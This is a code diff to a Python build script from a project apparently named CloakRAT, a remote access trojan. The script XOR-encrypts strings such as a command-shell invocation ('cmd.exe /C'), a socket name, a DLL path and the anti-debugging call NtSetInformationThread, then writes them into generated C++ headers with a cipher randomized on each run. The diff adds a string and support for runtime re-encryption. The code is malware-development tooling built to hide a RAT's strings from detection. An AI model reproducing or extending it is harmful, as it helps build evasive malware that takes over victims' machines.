@@ -14,6 +14,7 @@ strings_to_encrypt = {
     'str_ip': '127.0.0.1',
     'str_cmd': 'cmd.exe /C',
     'str_dllPath': 'C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Release\\CloakRAT.dll',
+    'str_socket': 'socket',
     
     # function names
     'str_NtSetInformationThread': 'NtSetInformationThread',
@@ -49,12 +50,11 @@ def get_random_op() -> str:
     return secrets.choice(['+', '-', '*'])
 
 def xor_encrypt(string_plaintext: str, key: list[int], cipher: str) -> list[int]:
-    # loop through the plaintext and just xor it with the cipher
-    encrypted_bytes = []
+    # The highest bit in the first byte is preserved to indicate if runtime re-encryption has happened (see runtime_reencryption())
+    encrypted_bytes = [secrets.randbelow(128)] # highest possible random value is 2^7
     data = string_plaintext.encode('utf-8') + b'\x00' # add the null terminator because this we treat the string as a C-style string 
 
-    for i, byte in enumerate(data):
-        
+    for i, byte in enumerate(data, 1):
         encrypted_bytes.append((byte ^ eval(cipher)) & 0xFF)
     
     return encrypted_bytes
@@ -80,7 +80,7 @@ def main():
     rand_xor_value = secrets.randbelow(256)
     
     # BE CAREFUL TO EDIT VARIABLE NAMES HERE, BECAUSE THIS IS GOING TO BE PROCESSED BY eval()
-    byte_chiper = f"((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + key[i % len(key)] & ((i//2)>>3) * i {rand_op3} key[i % len(key)]) << i) ^ {rand_xor_value})" # randomize the cipher each run
+    byte_chiper = f"((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + key[i % len(key)] & ((i//2)>>3) * i {rand_op3} key[i % len(key)]) << 16) ^ {rand_xor_value})" # randomize the cipher each run
     
     # Generate the Source file 
     with open(f'{DIR}/{SOURCE_NAME}', 'w') as source_file:
@@ -94,8 +94,7 @@ def main():
     
     # Generate the Header file
     with open(f'{DIR}/{HEADER_NAME}', 'w') as header_file:
-        
-        c_style_byte_cipher = f"(unsigned char)((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()] & ((i/2)>>3) * i {rand_op3} {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()]) << i) ^ {rand_xor_value})"
+        c_style_byte_cipher = f"(unsigned char)((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()] & ((i/2)>>3) * i {rand_op3} {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()]) << 16) ^ {rand_xor_value})"
         
         header_file.write('#pragma once\n\n')
         header_file.write('#include <array>\n\n')
